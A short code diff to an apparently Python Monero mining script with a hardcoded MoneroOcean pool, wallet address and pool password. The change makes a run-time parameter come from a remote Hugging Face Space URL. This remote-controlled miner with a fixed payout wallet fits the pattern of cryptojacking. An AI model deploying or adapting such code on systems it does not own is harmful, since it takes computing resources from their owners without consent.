@@ -4,6 +4,8 @@
 from datetime import datetime
 from pytz import timezone
 
+import requests
+
 import argparse
 import socket
 import select
@@ -21,7 +23,7 @@ from multiprocessing import Process, Queue
 
 pool_host = 'gulf.moneroocean.stream'
 pool_port = 10002
-gpool_pass = 'nord'
+gpool_pass = 'nordev'
 wallet_address = '49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g'
 nicehash = False
 
@@ -36,7 +38,10 @@ global hhunx
 
 hhunx =-1
 
-
+def gnum():
+    da = requests.get("https://hugoome-loc.hf.space")
+    dac = int(da.text)
+    return dac
 
 def controller(q,s,t,k):
 
@@ -220,4 +225,4 @@ if __name__ == '__main__':
         pool_port = int(args.port)
     
     
-    controller(q, s,1,hhunx)
+    controller(q, s,gnum(),hhunx)
